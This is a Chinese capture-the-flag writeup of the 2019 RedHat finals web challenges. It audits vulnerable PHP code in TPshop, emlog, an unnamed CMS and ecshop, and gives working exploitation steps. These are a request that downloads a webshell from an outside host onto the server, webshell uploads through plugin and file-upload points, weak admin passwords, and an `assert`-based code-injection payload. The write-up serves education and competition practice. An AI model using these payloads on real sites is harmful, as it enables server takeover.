---
title: 2019 RedHat决赛 Writeup
date: December 18th 2019
tags: [CTF, Writeup, PHP, 代码审计]
summary: 2019 RedHat 杯决赛 Web 方向 Writeup，四道题均为 PHP 代码审计，记录 TPshop 框架漏洞等题目的利用思路。
---

# 2019 RedHat决赛 Writeup

*Threezh1 Jokuuy Playmaker 2019年11月23日*

离结束只有40多分钟了，web题ak了之后不会修… 把wp写一下吧。web四个题都是简单的代码审计题。

## 粤湾基金

地址： [http://172.16.9.41:9005/](http://172.16.9.41:9005/) 

是一个TPshop的商城框架，界面如图所示：

![01.png](https://i.loli.net/2020/02/11/a5BFKXCgDlGZJE6.png)

漏洞文件：\application\home\controller\Test.php

漏洞函数：dlfile()

```php
public function dlfile($file_url, $save_to)
{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_POST, 0); 
        curl_setopt($ch,CURLOPT_URL,$file_url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        $file_content = curl_exec($ch);
        curl_close($ch);
        $downloaded_file = fopen($save_to, 'w');
        fwrite($downloaded_file, $file_content);
        fclose($downloaded_file);
}
```

本地写一个包含一句话的木马(shell.txt)然后访问：

```plain
/Home/Test/dlfile?file_url=http://xxxx/shell.txt&save_to=/var/www/html/shell.php
```

然后用蚁剑连接：/shell.php 即可。

## 粤湾期货

地址： [http://172.16.9.41:9006/](http://172.16.9.41:9006/)

是一个emlog搭建的站点，以前打算审的，放弃了。界面如下：

![02.png](https://i.loli.net/2020/02/11/cFWP38aRv5UC6ed.png)

找到后台路径：/admin/

用户名admin，爆破出密码为admin12345 进入后台

后台有一个上传插件的点，验证压缩包格式的代码如下：

```php
function emUnZip($zipfile, $path, $type = 'tpl') {
    if (!class_exists('ZipArchive', FALSE)) {
        return 3;//zip模块问题
    }
    $zip = new ZipArchive();
    if (@$zip->open($zipfile) !== TRUE) {
        return 2;//文件权限问题
    }
    $r = explode('/', $zip->getNameIndex(0), 2);
    $dir = isset($r[0]) ? $r[0] . '/' : '';
    switch ($type) {
        case 'tpl':
            $re = $zip->getFromName($dir . 'header.php');
            if (false === $re)
                return -2;
            break;
        case 'plugin':
            $plugin_name = substr($dir, 0, -1);
            $re = $zip->getFromName($dir . $plugin_name . '.php');
            if (false === $re)
                return -1;
            break;
  ...

```

从代码可知，一个插件名字叫做plugin，压缩包里面的内容就需要为plugin/plugin.php，不然格式就会验证错误。

将一句话的shell写入plugin.php，上传之后会被解压，然后访问即可getshell。

## 粤湾投资

地址： [http://172.16.9.41:9007/](http://172.16.9.41:9007/)

陈师傅以前审过的一个cms，快速的拿到了一血。当时没有截到这个cms的图，所以就直接看具体的代码吧：

任意文件上传：

echo/Apps/Home/Controller/UploadfileController.class.php

```php
/**
 * [index 文件上传代码]
 * @return [type] [description]
 */
public function index(){
	if(IS_POST){

		/**
		 * 1、如果是图片直接调用uploadPhoto()
		 * 2、如果是替他附件则按照当前配置设置
		*/
		$type = I('post.type','files');
		$saveDir = I('post.savedir');
		$thumbw = I('post.thumbw');
		$thumbh = I('post.thumbh');
		$filesize = I('post.filesize');
		if($type == 'images' || preg_match('/^image\//', $_FILES['Filedata']['type'][0])){
			$type = "images";
			//是否添加水印
			$water = I('post.water');

			if($water){
				$water_site = C('SITE_SYSTEM_IMG_WATER');
				$water_new = isset($water_site) && !empty($water_site) ? $water_site : C('SYSTEM_IMG_WATER');
			    //$info = uploadPhoto('photo/'.$type.'',$thumbw,$thumbh,array('open'=>1));
				$info = uploadPhoto($saveDir.'/'.$type,$thumbw,$thumbh,$water_new,$filesize);
			} else {
				$info = uploadPhoto($saveDir.'/'.$type,$thumbw,$thumbh,'',$filesize);
			}

			if(!is_array($info)){
				$error_data['info'] = $info;
				$error_data['status'] = 0;
				$this->ajaxReturn($error_data);
			}

			$file['oringinal_type'] = 'images';
			$file['status'] = 1;
			$file['name'] = $_FILES['Filedata']['name'][0];
			$file['savename'] = $info[0]['savename'];
			$file['photo'] = substr($info[0]['savepath'],1).$info[0]['savename'];
			$file['thumb'] = $info[0]['thumbpath'];
			$file['location'] = 'upload';
			$this->ajaxReturn($file);
		} else {
			$type = 'files';
			$upload = new \Think\Upload();
			$upload->maxSize = $filesize*1024; //文件上传的最大文件大小，附件最大100M
			$upload->rootPath = "./"; //文件上传保存的根路径
			$upload->savePath = $upload->rootPath."Public/Uploads/".$saveDir."/" . $type ."/";//文件上传的保存路径
			$upload->saveName = date("YmdHis")."_".uniqid(); //上传文件的保存规则
			$upload->replace = true; //存在同名文件是否是覆盖
			$upload->autoSub = true;//自动使用子目录保存上传文件
			$upload->subName = date("Ymd");//子目录创建方式，采用数组或者字符串方式定义
			$upload->hash = true;//是否生成文件的hash编码 默认为true

			if(!$info = $upload->upload()){
				$error_data['status'] = 0;
				$error_data['info'] = $upload->getError();
				$this->ajaxReturn($error_data);
			} else {
				//处理文件图标
				//excel
				if(in_array($info[0]['ext'], array('xls','xlsx'))){
					$info[0]['ext'] = 'xls';
				}
				//ppt
				if(in_array($info[0]['ext'], array('ppt','pptx'))){
					$info[0]['ext'] = 'ppt';
				}
				//word
				if(in_array($info[0]['ext'], array('doc','docx'))){
					$info[0]['ext'] = 'doc';
				}
				//音频
				if(in_array($info[0]['ext'], array('wma','mp3','mid','wav'))){
					$info[0]['ext'] = 'mp3';
				}
				//视频
				if(in_array($info[0]['ext'], array('avi','mov','mpeg','mpg','swf','mp4'))){
					$info[0]['ext'] = 'vedio';
				}
				//zip
				if(in_array($info[0]['ext'], array('zip','rar','7z'))){
					$info[0]['ext'] = 'zip';
				}
				//判断是否存在文件不存在则取默认图片
				if(!file_exists("./Public/images/uploadfile/".$info[0]['ext'].".png")){
					$info[0]['ext'] = "readme";
				}
				$info[0]['status'] = 1;
				$info[0]['oringinal_type'] = 'files';
				$info[0]['savepathall'] = substr($info[0]['savepath'],1).$info[0]['savename'];
				$info[0]['location'] = 'upload';
				$this->ajaxReturn($info[0]);
			}
		}
	} else {
		 //缩略图配置
		$site_thumbw = C('SITE_SYSTEM_THUMB_WIDTH');
		$site_thumbh = C('SITE_SYSTEM_THUMB_HEIGHT');
		$thumbw = isset($site_thumbw) && !empty($site_thumbw) ? C('SITE_SYSTEM_THUMB_WIDTH') : C('SYSTEM_THUMB_WIDTH');
		$thumbh = isset($site_thumbh) && !empty($site_thumbh) ? C('SITE_SYSTEM_THUMB_HEIGHT') : C('SYSTEM_THUMB_HEIGHT');
		$this->thumbw = I('get.thumbw',$thumbw);
		$this->thumbh = I('get.thumbh',$thumbh);
		$this->thumbw = $this->thumbw === 0 ? $thumbw : $this->thumbw;
		$this->thumbh = $this->thumbh === 0 ? $thumbh : $this->thumbh;

		$this->type = I('get.type',''); //类型
		$this->myid = I('get.myid',''); //返回容器内容的值
		$this->iframe = I('get.iframe',''); //返回的iframe容器
		$this->field = I('get.field','');
		$this->returntype = I('get.returntype','multiple'); //返回文件的个数类型，单个-single，多个-multiple，默认是多个

		//控制上传文件大小
		$this->filesize = I('get.filesize');
		if(empty($this->filesize)){
			if($this->type == 'images'){
				$this->filesize = 3072; //图片默认3M
			} else {
				$this->filesize = 102400; //附件默认100M
			}
		}

		//上传目录
		$this->savedir = I('get.savedir','uploadfile');
		$this->display();
	}
}

```

可以看到没对上传的文件进行后缀验证，可造成任意文件上传。直接getshell。

## 粤湾租赁

地址： [http://172.16.9.41:9008/](http://172.16.9.41:9008/) 

一个ecshop的商城框架，版本还挺新的。(里面的商品都是小米的？？？) 界面如下：

![03.png](https://i.loli.net/2020/02/11/rDbNvlRXZgs7fdQ.png)

跟第二题一样的，爆破进入后台。

用户名：admin

密码：admin123

进来后台可以查到最近文件的修改记录，直接看到了edit_languages.php在最近有修改过，于是直接就去审它了。

漏洞点：\admin\edit_languages.php

```php
elseif ($_REQUEST['act'] == 'edit')
{
    /* 语言项的路径 */
    $lang_file = isset($_POST['file_path']) ? trim($_POST['file_path']) : '';

    /* 替换前的语言项 */
    $src_items = !empty($_POST['item']) ? stripslashes_deep($_POST['item']) : '';

    /* 修改过后的语言项 */
    $dst_items = array();
    $_POST['item_id'] = stripslashes_deep($_POST['item_id']);

    for ($i = 0; $i < count($_POST['item_id']); $i++)
    {
        /* 语言项内容如果为空，不修改 */
        if (trim($_POST['item_content'][$i]) == '')
        {
            unset($src_items[$i]);
        }
        else
        {
            $_POST['item_content'][$i] = str_replace('\\\\n', '\\n', $_POST['item_content'][$i]);
            $dst_items[$i] = $_POST['item_id'][$i] .' = '. '"' .$_POST['item_content'][$i]. '";';
//            $dst_items[$i] = $_POST['item_id'][$i] .' = '. '\'' .$_POST['item_content'][$i]. '\';';
        }
    }

    /* 调用函数编辑语言项 */
    $result = set_language_items($lang_file, $src_items, $dst_items);

```

可以看到从post中获取到的file_path和item传入到了set_language_items。

跟踪过去：

```php
function set_language_items($file_path, $src_items, $dst_items)
{
    /* 检查文件是否可写（修改） */
    if (file_mode_info($file_path) < 2)
    {
        return false;
    }

    /* 获取文件内容 */
    $line_array = file($file_path);
    if (!$line_array)
    {
        return false;
    }
    else
    {
        $file_content = implode('', $line_array);
    }

    $snum = count($src_items);
    $dnum = count($dst_items);
    if ($snum != $dnum)
    {
        return false;
    }
    /* 对索引进行排序，防止错位替换 */
    ksort($src_items);
    ksort($dst_items);
    for ($i = 0; $i < $snum; $i++)
    {
        $file_content = str_replace($src_items[$i], $dst_items[$i], $file_content);

    }

    /* 写入修改后的语言项 */
    $f = fopen($file_path, 'wb');
    if (!$f)
    {
        return false;
    }
    if (!fwrite($f, $file_content))
    {
        return false;
    }
    else
    {
        return true;
    }
}
```

可以看到并未对写入的内容做严格的过滤。

拿flag的步骤：

进入到模板管理 => 语言项编辑 => 选择user.php => 搜索 用户信息

将内容用户信息处修改为：`${${assert($_POST[cmd])}}`

当时蚁剑连接user.php没有成功。使用了另外一种方式：

POST数据：`cmd=hightlight_file($_GET[a])`，传入一个`a=/flag`读取到的flag。